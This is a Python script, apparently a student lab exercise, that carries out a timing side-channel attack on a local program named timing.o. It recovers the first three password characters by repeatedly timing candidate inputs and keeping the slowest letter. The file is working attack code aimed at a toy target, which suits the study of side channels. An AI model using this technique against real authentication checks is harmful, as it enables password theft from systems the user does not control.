#!/usr/bin/env python

#--------------------------#
# Student 1 : Niv Bayazi   #
# Student 2 : Uri Grinberg #
#--------------------------#

import time
import os
import string

def calculateAVG(arr):
	sum = 0
	for x in xrange(0,100):
		sum+=(arr[x])
	return (sum/100)

def findMax(dictionary):
	maxDic = dict()
	maxDic = dictionary
	letters = string.ascii_lowercase
	bestTime = max(dictionary.values())
	for x in letters:
		if ((dictionary[x]) == bestTime):
			return x


def findThreeCharactersOfPassword(curString):
	command = './timing.o'
	catPass = 'xxx'
	letters = string.ascii_lowercase
	dictionary = dict()
	for c in letters:
		#print curString + c
		arr = []
		for x in range(0,250):
			startTime = time.time()
			os.system(command + ' ' + curString + c +" > /dev/null")
			totalTime = time.time() - startTime
			#print totalTime
			arr.append(totalTime)
		arr.sort()
		dictionary[c] = calculateAVG(arr)
	passwordChar = findMax(dictionary)
	#print "the char from the password is : " + passwordChar
	return passwordChar

def main():
	timeOfAttack = time.time()
	curString = ""
	print "##########################################################################"
	print "#                                                                        #"
	print "#  Wait a little ,we are working to get you the first 3 characters... =) #"
	for i in xrange(0,3):
		theChar = findThreeCharactersOfPassword(curString)
		curString += theChar
	print "#  The first three characters are: " + curString + "                                   #"
	AttackFinshedTime = time.time() - timeOfAttack

	print "#  The time taken for the attack was: " + str(AttackFinshedTime) + " seconds              #"
	print "#                                                                        #"
	print "##########################################################################"




main()